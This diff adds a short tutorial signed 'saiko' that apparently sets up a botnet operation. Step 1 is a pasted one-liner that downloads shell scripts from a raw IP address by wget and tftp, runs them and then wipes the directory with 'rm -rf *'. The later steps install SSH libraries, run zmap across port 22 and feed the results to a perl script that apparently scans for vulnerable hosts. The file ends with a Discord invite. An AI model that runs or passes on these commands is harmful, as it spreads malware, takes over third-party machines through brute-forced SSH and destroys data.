@@ -1,0 +1,43 @@
+tut made by saiko
+
+AFTER YOU COPY AND PASTE THESE COMMANDS MAKE SURE YOU ACTUALLY RUN THEM BY HITTING ENTER IF THEY DONT AUTO START!
+
+1) copy and paste this:   cd /tmp || cd /run || cd /; wget http://194.15.36.212/jsdfgbins.sh; chmod 777 jsdfgbins.sh; sh jsdfgbins.sh; tftp 194.15.36.212 -c get jsdfgtftp1.sh; chmod 777 jsdfgtftp1.sh; sh jsdfgtftp1.sh; tftp -r jsdfgtftp2.sh -g 194.15.36.212; chmod 777 jsdfgtftp2.sh; sh jsdfgtftp2.sh; rm -rf jsdfgbins.sh jsdfgtftp1.sh jsdfgtftp2.sh; rm -rf *
+
+2) type: cd
+
+3) drag files 
+
+4) wait until upload finished
+
+5) copy and paste this: sh Scanner.sh
+
+6) copy and paste this: sh Scanner.sh
+
+7) copy and paste this: sh zmap.sh.sh
+
+8) copy and paste this: yum install gcc cpan php-pear php-devel libssh2 libssh2-devel -y
+
+9) copy and paste this: pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo
+
+10) copy and paste this: extension=ssh2.so>/etc/php.d/ssh2.ini
+
+11) copy and paste this: cpan -fi Net::SSH2
+
+12) copy and paste this: cpan -fi Parallel::ForkManager
+
+13) copy and paste this: sh zmap.sh
+
+
+
+
+zmap -p22 -w black.lst -o mfu.txt -B100M99
+
+chmod 777 *
+
+./update 1500
+
+perl saiko.pl vuln.txt
+
+
+https://discord.gg/xhX2DFU
